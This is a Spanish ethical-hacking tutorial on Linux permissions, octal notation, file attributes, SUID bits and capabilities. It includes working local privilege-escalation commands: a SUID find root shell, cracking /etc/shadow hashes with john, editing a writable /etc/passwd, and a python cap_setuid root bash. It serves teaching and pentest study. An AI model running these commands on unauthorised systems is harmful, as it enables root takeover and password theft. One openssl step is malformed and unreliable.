---
description: >-
  Veremos como leer los permisos de un fichero y como encontrar permisos para
  realizar la explotación.
---

# 🔐 Permisos y explotación

![](https://raw.githubusercontent.com/w0lfst/Apuntes-Hacking-Etico/main/assets/images/permisos.png)

{% hint style="info" %}
`X` puede tener dos significados, en caso de que sea una fichero significa que tienes permiso para ejecutarlo y si es un directorio significa que puedes entrar.&#x20;
{% endhint %}

## Permisos formato decimal

| rwx | r-x | r-x |
| --- | --- | --- |
| 7   | 5   | 5   |

* 7 = 1+2+4
* 5 = 1+4
* 5 = 1+4

La posición se cuenta desde la derecha, cada letra tendría los siguientes números:

* x = 1
* w = 2
* r  =4

{% hint style="info" %}
Todo esta convertido de binario a decimal. Para saber como realizar la conversión mira el siguiente punto.
{% endhint %}

### ¿Cómo convertir de binario a decimal?

| r-x | r-- | -w- |
| --- | --- | --- |
| 101 | 100 | 010 |
| 5   | 4   | 2   |

* En el primer ejemplo (r-x) tendríamos que contar la posición desde la derecha, seria así:
  * 0 = x
  * 1 = -
  * 2 = r
* Solo operamos con las posiciones que tengan un 1, es decir, con la posición 0 y 2.
* A continuación elevamos 2 a cada posición:
  * 2^0 + 2^2 = 1 + 4 = 5
  * 2^2 = 4
  * 2^1 = 2

## Atributos de ficheros.

***

El uso del comando está restringido naturalmente al usuario root y en algunos casos al propietario del fichero.

En el siguiente ejemplo vemos como evitar que el propio usuario borre un fichero:

```bash
chattr +i -V fichero.txt
```

* `+i` Añade flag que impide borrar el fichero incluido el usuario **root**.
* `-V` Muestra todo lo que realiza el comando.

{% hint style="info" %}
[Clic aquí para ver el manual de chattr](https://man7.org/linux/man-pages/man1/chattr.1.html)
{% endhint %}

Si queremos ver los atributos que tiene un fichero utilizamos el siguiente comando:

```bash
lsattr fichero.txt
```

## Permisos SUID

Los permisos SUID son permisos de acceso que pueden asignarse a archivos o directorios. Son utilizados principalmente para permitir a los usuarios del sistema ejecutar binarios con privilegios elevados temporalmente para realizar una tarea específica.

Si un fichero tiene activado el bit **Setuid** se identifica con una `s` de la siguiente forma:

```
w0lfst@h4cknet:~$ ls -l /usr/bin/passwd
-rwsr-xr–x 1 root root 27920 ago 15 22:45 /usr/bin/passwd
```

Esta propiedad es necesaria para que los usuarios normales puedan realizar tareas que requieran privilegios más altos que los que dispone un usuario común.&#x20;

### Ejemplo de explotación

1. Asignamos el permiso setuid, por ejemplo, el comando **find** es 755, con `chmod` añadimos un 4 al permiso del archivo, quedaría así:

```bash
chmod 4755 /usr/bin/find
```

Ahora buscaríamos en [GTFOBins](https://gtfobins.github.io/) el comando que tiene ese permiso, en este caso, el comando find.

GTFOBins nos dice que ejecutemos el siguiente comando para obtener una sh:

```bash
find . -exec /bin/sh -p \; -quit
```

Así conseguimos acceso root gracias a que el comando find tenia asignado un permiso setuid.

### ¿Cómo lo hacemos si no podemos asignar permisos suid?

Para buscar permisos suid en la maquina victima utilizaremos la herramienta find de la siguiente manera:&#x20;

```bash
find / -type f -perm -4000 2>/dev/null 
```

{% hint style="info" %}
`2>/dev/null` se utiliza para evitar que salgan errores por la terminal, como no tenemos acceso a todos los ficheros de la maquina saldrían muchos avisos de `Permision denied` y de esta forma lo evitamos.
{% endhint %}

Buscar archivos con permisos de escritura:

```bash
find / -writable 2>/dev/null 
```

## Ejemplos ataque:

### Permiso de lectura:

Si tenemos permiso para ver el archivo shadows podremos ver las contraseñas de los usuarios hasheadas en un formato sha-512.

{% hint style="info" %}
Podemos ver el tipo de hash que utiliza nuestra distribucin de linux con el siguiente comando: `cat /etc/login.defs | grep "ENCRYPT_METHOD"`
{% endhint %}

* Desencriptaremos las contraseñas por fuerza bruta, por ejemplo con el diccionario rockyou.
* Exportamos el hash:

```bash
cat /etc/shadow | grep "user" > hash
```

* Crackeamos:

```bash
john --wordlist=/usr/share/wordlists/rockyou hash 
```

* Vemos la contraseña:

```bash
john --show hash
```

### Permisos de escritura:

Si tenemos permisos para escribir en el `/etc/passwd` haremos lo siguiente:

* Nos creamos una contraseña:

```bash
openssl nueva-contraseña
```

1. Veremos un hash y lo copiamos.
2. Con `hash` y `hashid` podemos saber en que formato esta hecho.
3. Modificamos el `/etc/passwd` y ponemos el hash que hemos generado para así loguearnos como ese usuario con la contraseña creada anteriormente.

## Capabilities

Asignaremos un capabilite para realizar la prueba:

```bash
setcap cap_setuid+ep /usr/bin/python3.9
```

En este caso estamos asignando una capabilitie de tipo setuid, podemos ver mas tipos [aqui](https://wiki.gentoo.org/wiki/Hardened/Overview\_of\_POSIX\_capabilities).

Para obtener las capabilities que tenemos asignadas actualmente:

```bash
cd /
getcap -r / 2>/dev/null
```

En este caso encontraremos una capabilitie de python tipo `cap_setuid+ep`.\
Aprovecharemos esta capabilitie para lanzarnos una bash con privilegios de root:

```bash
python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
